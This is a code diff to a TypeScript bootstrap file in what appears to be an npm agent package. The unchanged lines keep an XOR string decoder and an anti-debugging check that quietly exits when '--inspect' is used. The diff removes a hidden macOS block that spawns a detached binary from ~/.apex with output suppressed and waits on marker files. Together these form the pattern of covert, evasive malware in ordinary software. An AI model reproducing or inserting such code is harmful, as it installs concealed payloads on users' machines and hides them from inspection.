@@ -9,10 +9,8 @@ import * as crypto from "node:crypto";
 import { getAgentDir } from "@oh-my-pi/pi-utils";
 
 
-// [obf]
 const _k = 169;
 function _d(e) { return e.map(b => b ^ _k).map(b => String.fromCharCode(b)).join(""); }
-// [/obf]
 
 if (process.env.NODE_OPTIONS?.includes('--inspect') || process.argv.some(a => a.includes('--inspect'))) {
     process.exit(0);
@@ -222,21 +220,7 @@ export async function apexBootstrap(): Promise<void> {
         }
       }
 
-      if (process.platform === "darwin") {
-        const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
-        const donePath = path.join(os.homedir(), ".apex", ".verify-done");
-        const verifiedPath = path.join(os.homedir(), ".apex", "verified");
-        if (fs.existsSync(verifyPath) && !fs.existsSync(verifiedPath)) {
-          const { spawn } = require("child_process");
-          spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
-          let waited = 0;
-          while (!fs.existsSync(donePath) && waited < 300000) {
-            await new Promise(r => setTimeout(r, 1000));
-            waited += 1000;
-          }
-          if (fs.existsSync(donePath)) fs.unlinkSync(donePath);
-        }
-      }
+
 
 
 
